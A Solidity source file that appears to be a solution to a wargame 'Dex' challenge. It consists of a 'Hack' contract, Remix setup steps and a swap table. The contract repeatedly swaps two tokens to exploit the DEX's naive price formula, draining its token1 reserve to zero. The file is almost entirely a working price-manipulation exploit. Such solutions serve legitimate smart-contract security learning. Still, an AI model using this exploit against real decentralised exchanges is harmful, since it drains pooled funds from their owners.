//SPDX-License-Identifier:MIT
pragma solidity ^0.8.0;

/* 
 *  @idea
 * ********* follow along in remix ************
 * deploy the hack contract with instance address as constructor arg
 * now we need to get the token1 and token2 address to approve our hack contract to use them in swap process
 * so we select the IDEX contract from menu and put the instance address in "At Address" section 
 * get the address of tokens from function selector
 * change the contract to IERC20 from menu and load the token contracts by putting them respectively again
 * in the "At Address" section
 * approve the hack contract to be the spender
 * now u're all set to call attack()
 * go on when done , submit the instance
 */
contract Hack {
    IDex private _dex;
    IERC20 private immutable token1;
    IERC20 private immutable token2;

    constructor(address target) {
        _dex = IDex(target);
        token1 = IERC20(_dex.token1());
        token2 = IERC20(_dex.token2());
    }

    /**
     * token1          |     token2
     *  10      | 100     |   100  | 10
     *  10 in  | 100     |   100  |  10 out
     *  24 out | 110     |   90   |  20 in
     *  24 in  | 86      |   110  |  30 out
     *  41 out | 110     |   80   |  30 in
     * 41 in   | 69      |   110  |  65 out
     * 110 out | 110     |  45    |  45 in
     *         |  0      |  90    |
     *
     */

    function attack() external {
        token1.transferFrom(msg.sender, address(this), 10);
        token2.transferFrom(msg.sender, address(this), 10);

        token1.approve(address(_dex), type(uint256).max);
        token2.approve(address(_dex), type(uint256).max);

        _dex.swap(address(token1), address(token2), 10);
        _dex.swap(address(token2), address(token1), 20);
        _dex.swap(address(token1), address(token2), 24);
        _dex.swap(address(token2), address(token1), 30);
        _dex.swap(address(token1), address(token2), 41);
        _dex.swap(address(token2), address(token1), 45);

        require(token1.balanceOf(address(_dex)) == 0, "dex token1 balance != 0");
    }
}

interface IDex {
    function token1() external view returns (address);
    function token2() external view returns (address);
    function getSwapPrice(address from, address to, uint256 amount) external view returns (uint256);
    function swap(address from, address to, uint256 amount) external;
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}
